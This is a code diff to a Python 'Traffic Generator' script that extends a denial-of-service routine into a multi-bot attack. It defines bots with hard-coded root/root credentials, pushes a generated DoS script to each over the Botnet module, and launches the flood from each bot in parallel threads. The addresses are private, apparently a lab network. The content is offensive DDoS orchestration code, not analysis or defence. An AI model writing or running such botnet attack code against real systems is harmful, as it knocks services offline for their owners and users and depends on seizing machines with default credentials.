@@ -1,7 +1,7 @@
 # Traffic Generator
 from Inputs import get_inputs
 import Botnet
-import getpass, socket, time, subprocess
+import getpass, socket, time, subprocess, threading, sys
 
 # generate regular traffic and requests
 def generate_traffic(host, transmission, port, buffer_size, message):
@@ -79,13 +79,17 @@ if "Kb" in buffer_size:
 elif "B" in buffer_size:
     buffer_size = int(buffer_size.replace("B", ""))
 
-#host = "192.168.3.130"
-host = "192.168.126.128"
-bot = "192.168.126.129"
+host = "192.168.3.130"
+#host = "192.168.126.128"
+bot1 = "192.168.3.131"
+bot2 = host
+#bot = "192.168.126.129"
 username = "root"
 password = "root"
 message = "Hello"
 att_msg = "Denial Of Service"
+
+botnet = { bot1: [username, password], bot2: [username, password] }
 
 print("Target: {}, Protocol: {}, Port: {}, Buffer Size: {} bytes. \n".format(host, transmission, str(port), str(buffer_size)))
 
@@ -99,8 +103,19 @@ if DDOS:
     # generate bot_dos.py
     script = Botnet.create_bot_dos_script(host, att_msg, port, transmission, buffer_size)
     # transfer the script to each bot
-    Botnet.transfer_script(bot, username, password, script)
-    # run the attacl
-    ddos(bot, username, password, script, host, transmission, port, buffer_size, att_msg)
+    for bot, bot_credentials in botnet.items():
+        username = bot_credentials[0]
+        password = bot_credentials[1]
+        Botnet.transfer_script(bot, username, password, script)
+    # run the attack
+    print("BOTNET READY")
+    for bot, bot_credentials in botnet.items():
+        username = bot_credentials[0]
+        password = bot_credentials[1]
+        _thread = threading.Thread(target=ddos, args=((bot, username, password, script, host, transmission, port, buffer_size, att_msg)))
+        _thread.start()
+        print("{} is attacking {}.".format(bot, host))
+    #ddos(bot, username, password, script, host, transmission, port, buffer_size, att_msg)
 #print('Received: {}'.format(output))
 
+sys.exit(0)
